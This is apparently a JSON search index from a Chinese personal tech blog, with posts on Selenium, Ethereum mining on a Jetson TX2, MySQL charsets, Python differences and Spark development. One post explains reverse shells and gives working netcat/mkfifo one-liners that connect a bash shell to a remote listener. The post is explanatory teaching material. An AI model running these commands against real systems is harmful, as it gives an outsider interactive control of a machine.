    "http:\/\/localhost:1313\/tags\/tensorflow\/": {
        
        "title": "Tensorflow",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/tensorflow\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/tensorflow\/": {
        
        "title": "Tensorflow",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/tensorflow\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/tx2\/": {
        
        "title": "TX2",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/tx2\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/reverseshell\/": {
        
        "title": "ReverseShell",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/reverseshell\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/security\/": {
        
        "title": "Security",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/security\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%8F%8D%E5%BC%B9shell\/": {
        
        "title": "反弹shell",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%8F%8D%E5%BC%B9shell\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/reverse_shell\/": {
        
        "title": "说一说反弹shell",
            "tags": [ "ReverseShell",  "反弹shell", ],
    "content": " 今天简单研究了一下什么是反弹shell以及怎么构造反弹shell，简单总结一下。\n什么是反弹shell? 先说一下我是怎么理解反弹shell的。正常情况下从本地控制远程的一台机器可以通过远程登陆（比如ssh/telnet）从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell（也叫reverse shell）就是把方向反过来，从远程被控主机向本地建立连接，即远程被控机是client，本地是server。\n建立反弹shell 建立本地server 使用\u0026rsquo;nc\u0026rsquo;在本地建立server进行网络连接监听，本例子监听在8888端口上。\n$ nc -lvp 8888 建立远程client 方法1: 在远程被控机上用nc建立client进行连接。 $ mkfifo /tmp/f $ cat /tmp/f | bash -i 2\u0026gt;\u0026amp;1 | nc \u0026lt;Server IP\u0026gt; 8888 \u0026gt; /tmp/f **\u0026lsquo;mkfifo /tmp/f\u0026rsquo;**创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另外一端读取写入的内容。 **\u0026lsquo;cat /tmp/f\u0026rsquo;**读取有名管道中的内容，读取的内容通过管道\u0026rsquo;|\u0026lsquo;写入\u0026rsquo;bash\u0026rsquo; **\u0026lsquo;bash -i 2\u0026gt;\u0026amp;1\u0026rsquo;**建立交互式shell，并把标准错误合并到标准输出，然后通过管道\u0026rsquo;|\u0026lsquo;发给\u0026rsquo;nc\u0026rsquo;客户端 **\u0026rsquo;nc 8888 \u0026gt; /tmp/f\u0026rsquo;**向server发起连接，并把从server端接收到的内容写入\u0026rsquo;/tmp/f\u0026rsquo;，注意，这些写到\u0026rsquo;/tmp/f\u0026rsquo;的内容又被上面步骤'2\u0026rsquo;读出来写会给shell 好吧，是不是有些绕？再捋一下，前面的那一串命令建立了一个连接，该连接通过\u0026rsquo;nc\u0026rsquo;与server端进行连接，server端的输入会被发送到client端的\u0026rsquo;nc\u0026rsquo;并写入\u0026rsquo;/tmp/f\u0026rsquo;，之后被\u0026rsquo;cat\u0026rsquo;读出来发给shell执行。shell的执行输出通过\u0026rsquo;nc\u0026rsquo;发给server。连接的图示如下：\n方法2:在远程机上用建立连接 前面的方法1中不太简洁的地方是使用了‘cat’，那么能不能再简化一下呢？当然有！先画一张连接拓扑图。\n建立方法命令如下：\nmkfifo /tmp/f bash -i 2\u0026gt;\u0026amp;1 \u0026lt; /tmp/f | nc \u0026lt;Server IP\u0026gt; 8888 \u0026gt; /tmp/f 方法3: 了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。\n建立连接方法如下：\nmkfifo /tmp/f nc \u0026lt;Server IP\u0026gt; 8888 \u0026lt; /tmp/f | bash -i \u0026gt; /tmp/f 2\u0026gt;\u0026amp;1 其他话题 1. 啥是FIFO？ “FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处：\n都是进程间通讯的手段，可用于传递消息 都是“半双工单向”数据流模式 但不同之处在于：\n“PIPE”创建的管道存在于父/子进程之间，通常是fork()出来的父子进程间使用。 “FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。 想知道的更详细些可以阅读经典的《UNIX环境高级编程》。\n2. 思考一下下面的两个命令有什么不同？ nc \u0026lt;Server IP\u0026gt; 8888 \u0026lt; /tmp/f | bash -i 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/f nc \u0026lt;Server IP\u0026gt; 8888 \u0026lt; /tmp/f | bash -i \u0026gt; /tmp/f 2\u0026gt;\u0026amp;1 不同之处是**\u0026ldquo;2\u0026gt;\u0026amp;1 \u0026gt; /tmp/f\u0026rdquo;和\u0026quot;\u0026gt; /tmp/f 2\u0026gt;\u0026amp;1\u0026quot;**。\n**\u0026quot;\u0026gt; /tmp/f 2\u0026gt;\u0026amp;1\u0026quot;可以正确将标准输出与标准错误合并后导入\u0026quot;/tmp/f\u0026quot;，而\u0026ldquo;2\u0026gt;\u0026amp;1 \u0026gt; /tmp/f\u0026rdquo;**最终只把标准输出导入了\u0026quot;/tmp/f\u0026quot;，标准错误还是没有，那么是为什么呢？\n先分析一下正常**\u0026quot;\u0026gt; /tmp/f 2\u0026gt;\u0026amp;1\u0026quot;**的执行过程。\n先解析**\u0026quot;\u0026gt; /tmp/f\u0026quot;**的时候进程会把标准输出\u0026quot;1\u0026quot;定向到FIFO文件\u0026quot;/tmp/f\u0026quot; 再解析**\u0026ldquo;2\u0026gt;\u0026amp;1\u0026rdquo;**的时候，进程的标准错误“2”定向到了标准输出“1”对应的目标，由于此时“1”指向了\u0026quot;/tmp/f\u0026quot;，那么自然标准错误“2”也被定向到了这个FIFO文件。 再分析一下异常**\u0026ldquo;2\u0026gt;\u0026amp;1 \u0026gt; /tmp/f\u0026rdquo;**的执行过程。\n首先**\u0026ldquo;2\u0026gt;\u0026amp;1\u0026rdquo;**在执行的时候是把进程的标准错误“2”定向到了标准输出“1”对应的目标，这个目标此时是进程执行的“终端”。 当解析到**\u0026quot;\u0026gt; /tmp/f\u0026quot;**的时候进程会把标准输出\u0026quot;1\u0026quot;定向到FIFO文件\u0026quot;/tmp/f\u0026quot;，而此时标准错误“2”还是指向前一步中定向的“终端”，因此造成了执行的问题。 ", 
    "url": "http:\/\/localhost:1313\/post\/network\/reverse_shell\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/chromedriver\/": {
        
        "title": "Chromedriver",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/chromedriver\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/geckodriver\/": {
        
        "title": "Geckodriver",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/geckodriver\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/selenium\/": {
        
        "title": "Selenium",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/selenium\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/web\/selenium\/": {
        
        "title": "使用Python的Selenium驱动浏览器行为",
            "tags": [ "selenium",  "chromedriver",  "geckodriver", ],
    "content": " Step 1:安装浏览器driver 浏览器 Driver Chrome chromedriver Firefox geckodriver Step 2:安装selenium $ pip install selenium STep 3: 使用selenium 例子：打开两个tab，并在tab之间定期切换：\nimport time from selenium import webdriver from selenium.webdriver import ActionChains obj = webdriver.Chrome() obj.maximize_window() obj.get(\u0026#34;http://www.qq.com/\u0026#34;) obj.implicitly_wait(15) e1 = obj.find_element_by_xpath(\u0026#39;//*[@id=\u0026#34;navBeta\u0026#34;]/div[1]/div[1]/a[1]\u0026#39;) ActionChains(obj).click(e1).perform() obj.implicitly_wait(15) tabs = obj.window_handles print(tabs) while True: for i in tabs: obj.switch_to.window(i) time.sleep(2) 参考 Splinter ", 
    "url": "http:\/\/localhost:1313\/post\/network\/web\/selenium\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/8266\/": {
        
        "title": "8266",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/8266\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/esp8266\/": {
        
        "title": "ESP8266",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/esp8266\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/esp8266\/": {
        
        "title": "ESP8266",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/esp8266\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/hardware\/": {
        
        "title": "Hardware",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/hardware\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/": {
        
        "title": "Hardware",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/rc522\/": {
        
        "title": "RC522",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/rc522\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/rfid\/": {
        
        "title": "RFID",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/rfid\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/smart-water-machine\/": {
        
        "title": "自动饮水机",
            "tags": [ "ESP8266",  "8266",  "RC522",  "RFID", ],
    "content": " Youtube观看：\nYouku观看:\n", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/smart-water-machine\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/blockchain\/": {
        
        "title": "Blockchain",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/blockchain\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/technology\/blockchain\/": {
        
        "title": "Blockchain",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/technology\/blockchain\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ethereum\/": {
        
        "title": "Ethereum",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ethereum\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ethminer\/": {
        
        "title": "Ethminer",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ethminer\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/technology\/": {
        
        "title": "Technology",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/technology\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/technology\/": {
        
        "title": "Technology",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/technology\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E4%BB%A5%E5%A4%AA%E5%B8%81\/": {
        
        "title": "以太币",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E4%BB%A5%E5%A4%AA%E5%B8%81\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/technology\/blockchain\/ethereum-mining\/": {
        
        "title": "使用Nvidia Jetson TX2挖以太币",
            "tags": [ "以太币",  "ethereum",  "ethminer",  "Jetson",  "TX2", ],
    "content": " 现在加密货币在全世界都到了很疯狂的程度了，经常听说挖矿，那么挖矿究竟是怎么回事呢，到底怎么进行挖矿呢？这里介绍一下以太币挖矿的那些事儿。\n进行挖矿大概需要几个步骤：\n注册钱包 加入矿池 准备挖矿工具 开挖 下面详细介绍一下如何进行挖矿。\n获取以太币钱包地址 使用myetherwallet 挖矿前首先需要创建自己的钱包，可以到“myetherwallet”(https://www.myetherwallet.com)进行创建。\n第一步：输入密码，点击“Create New Wallet”： 第二步：保存\u0026quot;Keystore\u0026quot;密钥，密钥文件一定要小心保存，如果丢失了那么钱包就永远也找不回来了。另外最好使用物理隔离，可以存在U盘上需要用的时候再拿出来，或者干脆打印出来，如果密码被盗窃那所有的以太币就不保了 :P\n之后为了方便管理可以使用chrome浏览器的\u0026quot;\u0026ldquo;插件进行创建。\n使用MetaMask 还有一个更方便的创建钱包的方法，就是使用chrome浏览器的\u0026quot;MetaMask\u0026quot;插件进行创建和管理。 需要提醒一下，创建成功后一定要保护好创建钱包的那12个单词，这是唯一的恢复账号的方法！\n使用\u0026quot;MetaMask\u0026quot;跟myetherwallet不太一样的一点是，在创建出钱包的密钥是通过\u0026quot;MetaMask\u0026quot;进行管理的，这种方法有好有坏，好处是使用方便，坏处是一旦MetaMask挂了或者被黑的话，那么你的钱包也会受到牵连。\n选择矿池 有了钱包地址后需要加入矿池才有资格成为一名真正的矿工，截止2018-03-11，全世界的矿池总算力已经达到了259.27 TH/s\n（数据来自Top Miners）\n国内用户可以选择国内的矿池：\n矿池 地址 矿池 起付点 费率 f2pool https://www.f2pool.com eth.f2pool.com:8008eth.f2pool.com:8080 0.1 ETH 3% ethfans https://eth.ethfans.org/#/ huabei-pool.ethfans.org:3333huabei-pool.ethfans.org:13333guangdong-pool.ethfans.org:3333guangdong-pool.ethfans.org:13333 0.05 ETH 1% 选择挖矿软件 现在开好户签好合同了，矿工要开始干活了 :-)\n家里唯一有个靠谱GPU的机器就是我的小Jetson了，之前学习机器学习时候买的小平台，这下要从码农变身矿工了。\n常用的挖矿软件有两个：\n软件 CPU GPU CUDA OpenCL ethminer No Yes, ver \u0026gt; 9.0 Yes Yes geth Yes Yes Yes Yes 我为Jetson选择了ethminer，这个工具需要在Linux上编译一下：\n编译ethminer 开始前需要说一下，由于Jetson不支持OpenCL（Nvidia官方裁剪了系统 -__-凸），因此要在Jetson上使用ethminer的话就要直接使用CUDA，而且版本需要大于9.0，好在Jetpack v3.2使用了更高版本的CUDA。\nJetpack version: 3.2 从github下载ethminer https://github.com/ethereum-mining/ethminer\n编译ethminer 开始挖矿 挖矿前用先查看了下设备信息：\n确定可以正常看到GPU信息后就开撸吧。\n参数解释：\n-U: 指定使用CUDA方法进行计算 （-G是使用OpenCL，Jetson不支持\u0026hellip;） -S: 指定矿池地址 -FS: Failover矿池地址，当-S指定的矿池出现故障后会自动切换到这个地址 -O: 指定自己的钱包地址，否则就白费功夫啦 -SP: 指定stratum协议版本，需要跟矿池匹配，这里使用‘1’ -SE: 可以制定一个自己的邮件地址，可能后面会发送统计信息到这里 ", 
    "url": "http:\/\/localhost:1313\/post\/technology\/blockchain\/ethereum-mining\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/python\/python3\/": {
        
        "title": "python2 和 python3 的一些区别",
            "tags": [ "python3", ],
    "content": "python2与python3的区别 区别点 python2 python3 write() 可以直接写utf8内容 写utf8内容碰到：TypeError: write() argument must be str, not bytes解决方法：open(file, \u0026lsquo;wb\u0026rsquo;) super() super(CLASS_NAME, self).method() super().method() / 除法运算，结果取整数 除法运算，结果为浮点数，取证书使用“//” dict has_key()可以用来查询是否存在某个键 has_key()方法不存了，使用\u0026rsquo;key in dictionary\u0026rsquo;来查询(python2也支持该方法) python3的新特性 新特性 描述 参考 @ 矩阵乘法运算符，目前还没有定义built-in的矩阵数据类型 PEP 465 - A dedicated infix operator for matrix multiplication / 除法运算，结果浮点数 // 除法运算，结果取整数 ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/python\/python3\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/python3\/": {
        
        "title": "Python3",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/python3\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/charset\/": {
        
        "title": "Charset",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/charset\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/collate\/": {
        
        "title": "Collate",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/collate\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/database\/": {
        
        "title": "Database",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/database\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/database\/": {
        
        "title": "Database",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/database\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/database\/": {
        
        "title": "DataBase",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/database\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/mysql\/": {
        
        "title": "Mysql",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/mysql\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/mysql\/": {
        
        "title": "Mysql",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/mysql\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/database\/mysql_charset_collation\/": {
        
        "title": "Mysql charset\/collation字符编码设置",
            "tags": [ "DataBase",  "mysql",  "charset",  "collate", ],
    "content": "mysql在创建数据库时有两个跟字符编码相关的参数\u0026quot;character set\u0026quot;和\u0026quot;collate\u0026quot;，这里解释一下这两个参数的作用。\ncharacter set **“character set”**很容易解释，就是指定字符在存储到mysql中时使用的编码集。数据库支持哪些编码可以通过\u0026quot;show character set\u0026quot;获得。\ncollate 这个参数指定mysql根据哪些规则来比较存储的数据的字符集，这些信息可以用来进行数据的比较排序。\n这个参数的格式构成规则如下：\n\u0026ldquo;\u0026lt;字符集\u0026gt;_\u0026lt;语言相关信息\u0026gt;_\u0026lt;后缀\u0026gt;\u0026rdquo;\n例如： \u0026ldquo;utf8_general_ci\u0026rdquo;, \u0026ldquo;latin1_danish_ci\u0026rdquo;\nmysql一些其他特性 1. mysql支持4个级别的字符集设置：服务器，数据库，表，列。 1.1 服务器级别 作用： 服务器的字符集可以作为\u0026quot;CREATE DATABASE\u0026quot;的默认值\n设置方法： 启动参数： \u0026lsquo;\u0026ndash;character-set-server\u0026rsquo; \u0026lsquo;\u0026ndash;collation-server\u0026rsquo;\n查询： SHOW VARIABLES 查询 character_set_server/collation_server\n1.2 数据库级别 作用： 作为创建表时的默认值\n影响LOAD_DATA语句中的CHARACTER SET的值\n影响存储过程中与字符编码相关的操作\n设置方法： \u0026lsquo;CREATE DATABASE\u0026rsquo;或\u0026rsquo;ALTER DATABASE\u0026rsquo; 的参数 \u0026lsquo;CHARACTER SET\u0026rsquo; \u0026lsquo;COLLATE\u0026rsquo;\n查询： USE db_name;SELECT @@character_set_database, @@collation_database;\n1.3 表级别 作用： 每张表可以有表级别的字符集。\n设置方法： 使用 CREATE TABLE 和 ALTER TABLE 命令进行设置。\n查询： 1.4 列级别 作用： 字符类型的列（CHAR, VARCHAR, TEXT）可以有一个本列相关的 character set和collation设置。\n设置方法： 设置方法是在CREATE TABLE时使用相应的列参数。\n比如：\n查询： client/server通讯字符编码 设置： mysql数据库client/server之间通讯的字符编码也可以单独设置，设置的方法有若干种：\n使用SQL命令\u0026quot;SET NAME \u0026lsquo;charset_name\u0026quot;和 \u0026ldquo;SET CHAARACTER SET \u0026lsquo;charset_name\u0026rsquo;\u0026ldquo;设置：\n使用mysql配置文件设置：\n[mysql] default-character-set=koi8r\n使用mysql客户端设置：\n查询： 参考 *https://dev.mysql.com/doc/refman/5.7/en/charset.html\n", 
    "url": "http:\/\/localhost:1313\/post\/database\/mysql_charset_collation\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/blockchain\/": {
        
        "title": "Blockchain",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/blockchain\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/technology\/blockchain\/bitcoin-intro\/": {
        
        "title": "在区块链上存储信息",
            "tags": [ "blockchain", ],
    "content": "区块链本质上讲是一个分布式存储，目前流行的比特币/以太坊主要用来存储交易数据，那么是否可以利用这些公链存储别的信息呢？\n当然是有的，收集了几篇关于如何使用区块链存储数据文章，回头有空了再来整理一下。\nhttp://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html https://bitcoin.stackexchange.com/questions/39347/how-to-store-data-on-the-blockchain https://ethereum.stackexchange.com/questions/7884/how-can-i-store-data-in-ethereum-blockchain https://docs.google.com/document/d/1UwaaUgunnrFpL6jetA_DdNLQsbbqBx1HLcln07kLrUw/edit ", 
    "url": "http:\/\/localhost:1313\/post\/technology\/blockchain\/bitcoin-intro\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/scala\/": {
        
        "title": "Scala",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/programming\/scala\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/bigdata\/": {
        
        "title": "BigData",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/bigdata\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/": {
        
        "title": "BigData",
            "tags": [],
    "content": "关于大数据的文章。\n", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/python\/": {
        
        "title": "Python",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/python\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/scala\/": {
        
        "title": "Scala",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/scala\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/spark\/": {
        
        "title": "Spark",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/spark\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/spark\/": {
        
        "title": "Spark",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/spark\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/spark\/": {
        
        "title": "Spark",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/spark\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/spark\/spark-intro\/": {
        
        "title": "Spark开发",
            "tags": [ "spark",  "scala",  "python", ],
    "content": "使用scala进行开发 Step1: 安装sbt 配置源：\nStep2: 创建项目 可以使用Giter8模版创建项目。\nspark相关的几个模版：\nholdenk/sparkProjectTemplate.g8 (Template for Scala Apache Spark project). imarios/frameless.g8 (A simple frameless template to start with more expressive types for Spark) nttdata-oss/basic-spark-project.g8 (Spark basic project.) spark-jobserver/spark-jobserver.g8 (Template for Spark Jobserver) Step3: 编写代码 创建出的项目目录中包含一下主要条目：\n编写的代码放在 \u0026lsquo;src/main/scala/\u0026rsquo; 目录中：\nStep4: 编译打包 程序开发好之后首先需要编译打包：\n编译打包成功后的文件输出在 \u0026rsquo;target/scala-2.11/\u0026rsquo; 目录中：\n/home/spark/scala/frameless/target/scala-2.11/frameless_2.11-0.1.jar\nStep5: 部署运行 \u0026ndash;master: 指定spark driver的运行模式。 yarn-cluster: spark driver运行在yarn的application master进程中。如果应用只是进行计算可以使用这种方式运行，如果需要跟前台进行交互则可以考虑yarn-client模式。 yarn-client: spark driver运行在client进程中，此时application master只负责向yarn申请资源。 使用python进行开发 使用HDP环境提交任务 创建python文件pi.py\nimport sys from random import random from operator import add from pyspark.sql import SparkSession spark = SparkSession.builder.appName(\u0026quot;PythonPi\u0026quot;)\\.getOrCreate() partitions = int(sys.argv[1]) if len(sys.argv) \u0026gt; 1 else 2 n = 100000 * partitions def f(any): x = random() * 2 - 1 y = random() * 2 - 1 return 1 if x ** 2 + y ** 2 \u0026lt;= 1 else 0 count = spark.sparkContext.parallelize(range(1, n + 1), partitions).map(f).reduce(add) print(\u0026quot;Pi is roughly %f\u0026quot; % (4.0 * count / n)) spark.stop() 运行pi.py，这里指定使用yarn的cluster模式\nSPARK_MAJOR_VERSION=2 spark-submit --master yarn --deploy-mode cluster --driver-memory 512m --executor-memory 512m --deploy pi.py 10 在HDP环境运行jupyter server 使用yarn的cluster模式运行，在运行期间会始终在yarn中占用资源，如果需要长期运行，使用--master local比较好\nXDG_RUNTIME_DIR=\u0026quot;\u0026quot; SPARK_MAJOR_VERSION=2 PYSPARK_DRIVER_PYTHON=jupyter PYSPARK_DRIVER_PYTHON_OPTS='notebook --no-browser --port 8888 --ip 121.43.171.231' pyspark --master yarn --deploy-mode cluster --driver-memory 512m --executor-memory 512m 为jupyter server设置密码等操作参考jupyter文档\n运行后访问服务器8888端口即可访问jupyter服务\n非HDP环境开发 确保本机有一份spark二进制文件，比如spark-2.2.1-bin-hadoop2.7\n安装pyspark\npip install pyspark 设置SPARK_HOME（可选）\nexport SPARK_HOME=/home/xxx/spark-2.2.1-bin-hadoop2.7 通过代码提交任务\nimport os from pyspark import SparkConf, SparkContext # if `SPARK_HOME` is undefined yet if 'SPARK_HOME' not in os.environ: os.environ['SPARK_HOME'] = '/home/xxx/spark-2.2.1-bin-hadoop2.7' conf = SparkConf().setAppName('Demo').setMaster('yarn').set('spark.yarn.deploy.mode', 'cluster') sc = SparkContext(conf=conf) # Do something with sc... 或者使用SparkSession API\nfrom spark.sql import SparkSession spark = (SparkSession.builder .master(\u0026quot;yarn\u0026quot;) .appName(\u0026quot;Demo\u0026quot;) .config(\u0026quot;spark.yarn.deploy.mode\u0026quot;, \u0026quot;cluster\u0026quot;) .getOrCreate()) # Do something with spark... oozie自动化 TODO\nDevelopment Spark 2.0之前的开发接口主要是RDD（Resilient Distributed Dataset），从2.0之后原有RDD接口仍然支持，但RDD被Dataset取代，如果使用Dataset编程的话需要使用Spark SQL。\nAPI http://spark.apache.org/docs/1.3.1/api/scala/index.html\nSparkSession vs SparkContext Spark 2.0之前有3个主要的连接对象：\nSparkContext: 建立与Spark执行环境相关的连接，用于创建RDD SqlContext：利用SparkContext背后的SparkSQL建立连接 HiveContext：创建访问hive的接口 从Spark 2.0开始，Datasets/Dataframes成为主要的数据访问接口，SparkSession(org.apache.spark.sql.SparkSession)成为主要的访问Spark执行环境的接口。\nSparkConf Spark 2.0之前需要先创建SparkConf，在创建SparkContext。\nSpark 2.0之后可以不用显示的创建SparkConf对象就可以创建SparkSession对象。\n在SparkSession创建完后，Spark的运行时配置属性还可以通过SparkSession.conf()被修改：\nSpark conf参考 SparkSQL 2.0之前需要通过创建SqlContext来使用SparkSQL。\n2.0后通过SparkSession可以很方便的访问SparkSession.sql()来使用SparkSQL。\n访问Catalog Metadata SparkSession暴露了访问metastore的接口SparkSession.catalog，这个接口可以用来访问catalog metadata信息，比如（Hcatalog）\nDataFrame 和 Datasets Dataset： 强类型\n支持functional和relational操作\n操作分类\n转换（transformation）：用于产生新的Datasets 例如：map，filter，select，aggregate（groupBy） 操作（actions）：触发计算并返回结果 例如：count，show，把数据写回文件系统 lazy：计算只有到action触发的时候才进行。Dataset内部可以理解为存储了如何进行计算的计划。当action执行的时候Spark query optimizer生成并优化计算方案后将其执行。\nEncoder：把JVM中的类型T跟Spark SQL的数据表现形式进行转换的机制。（marshal/unmarshal?）\n两种创建方法：\n使用SparkSession的read()方法\n对现有Dataset做转换（transformation）\nDataset names = people.map((Person p) -\u0026gt; p.name, Encoders.STRING)); Dataset操作也可以是untyped，通过：Dataset, Column, DataFrame的function等。\n列操作\n选择一列（抛弃其他列）：select(\u0026ldquo;column\u0026rdquo;) 增加一列：withColumn(\u0026ldquo;newColumn\u0026rdquo;, Column) 修改一列: withColumn(\u0026ldquo;column\u0026rdquo;, Column) 删除一列: drop(\u0026ldquo;column\u0026rdquo;) 类型转换： 列高级操作：\nUDF: DataFrame： Dataset的无类型view (untyped view)，对应Dataset的Row DataFrame操作Functions DataFrame是有名列（named columns）组成的数据集合，类似关系数据库中的表或者python/R中的pandas。\n可以由多种数据源来构造DataFrame，比如Hive中的table，Spark的RDD（Resilient Distributed Datasets）。\nTODO: Datasets\nSparkSession有很多种方法创建DataFrame和Datasets。\nDataFrame 描述 创建API SparkSession.createDataFrame 访问 其他 Datasets 描述 创建API 访问 其他 Row 创建Row 访问 generic访问，使用ordinal序列访问\nrow(0)：访问列第一个成员\n原始类型访问\nColumn DataSet API: http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.Dataset\n处理时间 * ver \u0026lt;= 1.5 使用hiveContext来查询\n* 1.5 \u0026lt;= ver \u0026lt; 2.2 Spark 1.5引入了unix_timestamp()，所以在1.5之后到2.2的spark版本中可以这样操作时间信息\n* ver \u0026gt;= 2.2 import spark.implicits._ 引入toDF()方法和“$”操作符\n编程陷阱 陷阱1：dataframe有元素，但通过循环把值放入ListBuffer()后ListBuffer()却为空列表 可以看出两个问题：\n问题1: 虽然可以知道valueDF不为空，可是\u0026quot;println(\u0026hellip;)\u0026ldquo;却没有任何输出内容 问题2: 结果valueList为空 原因： Spark任务执行是通过Driver/Executor来完成的，Driver控制任务执行，Executor负责任务执行，foreach/for会被Driver分配给Executor来执行（分布式执行），每个Executor创建一个自己的ListBuffer拷贝，因此当任务结束后信息就丢失了。\n参考Stackoverflow的讨论：https://stackoverflow.com/questions/36203299/scala-listbuffer-emptying-itself-after-every-add-in-loop\n修复方法：使用collect() collect()定义：\n修复代码如下：\nReference Ambari workflow manager Scala basics Giter8项目模版 Automating Spark job with Oozie Using VirtualEnv with PySpark ", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/spark\/spark-intro\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/hive\/": {
        
        "title": "Hive",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/hive\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/hive\/": {
        
        "title": "Hive",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/hive\/"
        },
    
    
